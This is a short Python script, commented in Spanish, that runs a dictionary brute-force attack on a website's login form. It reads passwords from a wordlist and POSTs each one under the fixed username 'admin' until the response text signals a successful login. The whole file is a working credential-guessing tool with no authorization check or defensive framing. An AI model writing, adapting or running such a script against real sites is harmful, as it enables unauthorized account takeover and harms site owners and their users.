import requests

def try_login(url, username, password):
    payload = {'username': username, 'password': password}
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            # Se puede verificar la respuesta del servidor para determinar si el inicio de sesión fue exitoso
            if 'Inicio de sesión exitoso' in response.text:
                print(f"Login exitoso con las credenciales: {username}/{password}")
                return True
            else:
                print(f"Inicio de sesión fallido con las credenciales: {username}/{password}")
                return False
        else:
            print(f"Inicio de sesión fallido con las credenciales: {username}/{password}. Código de estado: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print("Error de conexión:", e)
        return False

def main():
    url = input("Ingrese la URL del sitio web: ")
    dictionary_file = input("Ingrese el nombre del archivo de diccionario: ")

    try:
        with open(dictionary_file, 'r', encoding='latin-1') as file:
            passwords = file.readlines()

        for password in passwords:
            password = password.strip()  # Eliminar caracteres de espacio en blanco alrededor de la contraseña
            print(f"Probando contraseña: {password}")
            if try_login(url, 'admin', password):  # Se asume que el nombre de usuario es 'admin'
                break
            else:
                continue
    except FileNotFoundError:
        print("El archivo de diccionario no se encontró.")

if __name__ == "__main__":
    main()
